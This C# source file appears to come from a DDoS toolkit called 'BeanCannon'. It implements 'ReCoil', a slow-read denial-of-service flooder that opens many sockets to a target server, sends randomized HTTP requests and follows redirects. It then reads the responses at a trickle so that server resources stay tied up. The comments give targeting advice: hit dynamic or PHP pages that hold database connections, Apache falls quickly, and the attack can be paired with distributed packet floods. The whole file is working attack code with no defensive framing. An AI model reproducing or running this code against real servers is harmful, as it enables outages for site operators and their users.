using BeanCannon.BusinessLogic.Core.Attacks.Settings;
using BeanCannon.BusinessLogic.Core.Extensions;
using BeanCannon.BusinessLogic.Core.Factory;
using BeanCannon.BusinessLogic.Core.Net.Interfaces;
using BeanCannon.BusinessLogic.Core.Randomizers;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;

namespace BeanCannon.BusinessLogic.Core.Attacks
{
	/// <summary>
	/// ReCoil basically does a "reverse" DDOS
	/// Requirements: the targeted "file" has to be larger than 24 KB (bigger IS better ;) !)
	/// </summary>
	/// <remarks>
	/// it sends a complete legimit request but throttles the download down to nearly nothing .. just enough to keep the connection alive
	/// the attack-method is basically the same as slowloris ... bind the socket as long as possible and eat up as much as you can
	/// apache servers crash nearly in an instant. this attack however can NOT be mitigated with http-ready and mods like that.
	/// this attack simulates sth like a massive amount of mobile devices running shortly out of coverage (like driving through a tunnel)
	///
	/// due to the nature of the congestian-response this could maybe taken a step further to self-feeding congestion-cascades
	/// if done "properly" in a distributed manner together with packet-floods.(??)
	///
	/// Limitations / Disadvantages:
	/// this does NOT work if you are behind anything like a proxy / caching-stuff.
	/// in this implementation however we are bound to the underlying system-/net-buffers ...
	/// due to that the required size of the targeted file differs -.-
	/// Dataflow: {NET} --> {WINSOCK-Buffer} --> ClientSocket .. so we have to make sure the actual data exceeds
	/// the winsock-buffer + clientsocket-buffer, but we can ONLY change the latter.
	/// from what i could find on a brief search / test the winsock buffer for a 10/100 links lies around 16-18KB
	/// where 1 GBit links have an underlying buffer around 64KB (size really does matter :P )
	///
	/// what to target?:
	/// although it might makes sense to target pictures or other large files on the server this doesn't really makes sense!
	/// the server could (and in most cases does - except for apache) always read directly from the file-stream resulting in nearly 0 needed RAM
	/// --> always target dynamic content! this has to be generated on the fly / pulled fom a DB
	/// and therefor most likely ends up in the RAM!
	///
	/// high-value targets / worst case szenario:
	/// as it seems the echo statement in php writes directly to the socket .. considering this it should be possible to
	/// take down the back-end infrastructure if the page does an early flush causing the congestation while still holding DB-conns etc.
	/// </remarks>
	public class ReCoil : BaseFlooder<ReCoilSettings>
	{
		private List<ISocket> socketsList = new List<ISocket>();

		public ReCoil(ReCoilSettings settings) : base(settings)
		{
			this.State.IsDelayed = true;
		}

		protected override void OnDoWorkEvent(object sender, DoWorkEventArgs e)
		{
			const int bufferSize = 16;
			const int minimalContentLength = 16384; // set minimal content-length to 16KB

			try
			{
				byte[] buffer = new byte[bufferSize];
				string redirect = "";
				DateTime stop = DateTime.UtcNow;
				IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(Settings.Ip), Settings.Port);

				State.Status = RequestStatus.Ready;
				while (State.IsFlooding)
				{
					stop = DateTime.UtcNow + Settings.Timeout;
					State.Status = RequestStatus.Connecting; // SET STATE TO CONNECTING //

					// forget about slow! .. we have enough saveguards in place!
					while (State.IsFlooding && State.IsDelayed && DateTime.UtcNow < stop)
					{
						ISocket socket = SocketFactory.Instance.GetSocket(endPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp, Settings.ProxyConnectionType);
						socket.ReceiveTimeout = (int)Settings.Timeout.TotalMilliseconds;
						socket.ReceiveBufferSize = bufferSize;

						try
						{
							socket.WrappedConnect(endPoint);
							socket.Blocking = Settings.WaitReply; // beware of shitstorm of 10035 - 10037 errors o.O
							byte[] sbuf = RandomizerHq.RandomHttpHeader(HttpMethod.Get, Settings.UrlPath, Settings.Host, Settings.UseRandomPath, Settings.AllowGzip, 300);
							socket.Send(sbuf);
						}
						catch { }

						if (socket.Connected)
						{
							bool keeps = !Settings.WaitReply;
							if (Settings.WaitReply)
							{
								do
								{
									// some damn fail checks (and resolving dynamic redirects -.-)
									if (redirect != "")
									{
										if (!socket.Connected)
										{
											socket = SocketFactory.Instance.GetSocket(endPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp, Settings.ProxyConnectionType);
											socket.ReceiveTimeout = (int)Settings.Timeout.TotalMilliseconds;
											socket.ReceiveBufferSize = bufferSize;
											socket.WrappedConnect(endPoint);
										}
										byte[] sbuf = RandomizerHq.RandomHttpHeader(HttpMethod.Get, redirect, Settings.Host, false, Settings.AllowGzip, 300);
										socket.Send(sbuf);
										redirect = "";
									}

									keeps = false;

									try
									{
										string header = "";
										while (!header.Contains(Environment.NewLine + Environment.NewLine) && (socket.Receive(buffer) >= bufferSize))
										{
											header += Encoding.ASCII.GetString(buffer);
										}

										string[] sp = header.Split(new char[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);

										for (int i = (sp.Length - 1); State.IsFlooding && i >= 0; i--)
										{
											string[] tsp = sp[i].Split(new char[] { ':' }, 2, StringSplitOptions.RemoveEmptyEntries);

											if (tsp.Length != 2)
												continue;

											tsp[0] = tsp[0].Trim();
											tsp[1] = tsp[1].Trim();

											if (tsp[0] == "Location")
											{ // parse and follow the redirect
												redirect = tsp[1];
												if (!redirect.StartsWith("/"))
												{
													try { redirect = new Uri(redirect).PathAndQuery; }
													catch { redirect = ""; }
												}
												break;
											}
											else if (tsp[0] == "Content-Length")
											{ // checking if the content-length is long enough to work with this!
												int sl = 0;
												if (int.TryParse(tsp[1], out sl) && sl >= minimalContentLength)
												{
													keeps = true;
													break;
												}
											}
											else if (tsp[0] == "Transfer-Encoding" && tsp[1].ToLowerInvariant() == "chunked")
											{ //well, what doo?
												keeps = true;
												break;
											}
										}
									}
									catch
									{ }
								} while (redirect != "" && DateTime.UtcNow < stop);

								if (!keeps)
								{
									State.Failed++;
								}
							}

							if (keeps)
							{
								socket.Blocking = true; // we rely on this in the dl-loop!
								socketsList.Insert(0, socket);
								State.Requested++;
							}
						}

						if (socketsList.Count >= Settings.SocketsPerThread)
						{
							State.IsDelayed = false;
						}
						else
						{
							System.Threading.Thread.Sleep(Settings.Delay);
						}
					}

					State.Status = RequestStatus.Downloading;
					for (int i = (socketsList.Count - 1); State.IsFlooding && i >= 0; i--)
					{ // keep the sockets alive
						try
						{
							// here's the downfall: if the server at one point decides to just discard the socket
							// and not close / reset the connection we are stuck with a half-closed connection
							// testing for it doesn't work, because the server than resets the connection in order
							// to respond to the new request ... so we have to rely on the connection timeout!
							if (!socketsList[i].Connected || (socketsList[i].Receive(buffer) < bufferSize))
							{
								socketsList.RemoveAt(i);
								State.Failed++;
								State.Requested--; // the "requested" number in the stats shows the actual open sockets
							}
							else
							{
								State.Downloaded++;
							}
						}
						catch
						{
							socketsList.RemoveAt(i);
							State.Failed++;
							State.Requested--;
						}
					}

					State.Status = RequestStatus.Completed;
					State.IsDelayed = (socketsList.Count < Settings.SocketsPerThread);
					if (!State.IsDelayed)
					{
						System.Threading.Thread.Sleep(Settings.Timeout);
					}
				}
			}
			catch
			{
				State.Status = RequestStatus.Failed;
			}
			finally
			{
				State.IsFlooding = false;
				// not so sure about the graceful shutdown ... but why not?
				for (int i = (socketsList.Count - 1); i >= 0; i--)
				{
					try
					{
						socketsList[i].Close();
					}
					catch { }
				}
				socketsList.Clear();
				State.Status = RequestStatus.Ready;
				State.IsDelayed = true;
			}
		}
	} // class ReCoil
}
